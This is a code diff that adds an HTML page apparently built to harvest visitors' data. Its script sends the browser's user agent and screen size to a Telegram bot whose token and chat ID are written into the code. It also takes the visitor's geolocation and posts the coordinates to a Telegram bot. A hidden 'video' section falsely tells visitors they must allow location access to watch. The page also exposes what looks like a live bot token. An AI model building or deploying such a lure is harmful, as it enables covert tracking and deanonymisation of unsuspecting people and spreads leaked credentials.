@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Telegram Bot</title>
+  <style>
+    #video-container {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Welcome to my Telegram Bot</h1>
+  
+  <button onclick="sendDeviceInfo()">Send Device Info</button>
+  <button onclick="requestLocation()">Request Location</button>
+  
+  <div id="video-container">
+    <h2>Video</h2>
+    <p>Please allow location permission to watch the video.</p>
+    <button onclick="requestLocation()">Allow Location</button>
+  </div>
+  
+  <script>
+    function sendDeviceInfo() {
+      var deviceInfo = {
+        userAgent: navigator.userAgent,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height
+      };
+      
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://api.telegram.org/bot6665901686:AAFTZi9DXkedyHhUdC0nQjzJvBFtNCThf6E/sendMessage', true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(JSON.stringify({
+        chat_id: '5990142501',
+        text: JSON.stringify(deviceInfo)
+      }));
+    }
+    
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            sendLocation(position.coords.latitude, position.coords.longitude);
+          },
+          function (error) {
+            console.log(error);
+          }
+        );
+      } else {
+        console.log('Geolocation is not supported by this browser.');
+      }
+    }
+    
+    function sendLocation(latitude, longitude) {
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage', true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(JSON.stringify({
+        chat_id: '<YOUR_CHAT_ID>',
+        text: 'Latitude: ' + latitude + ', Longitude: ' + longitude
+      }));
+      
+      showVideo();
+    }
+    
+    function showVideo() {
+      var videoContainer = document.getElementById('video-container');
+      videoContainer.style.display = 'block';
+    }
+  </script>
+</body>
+</html>
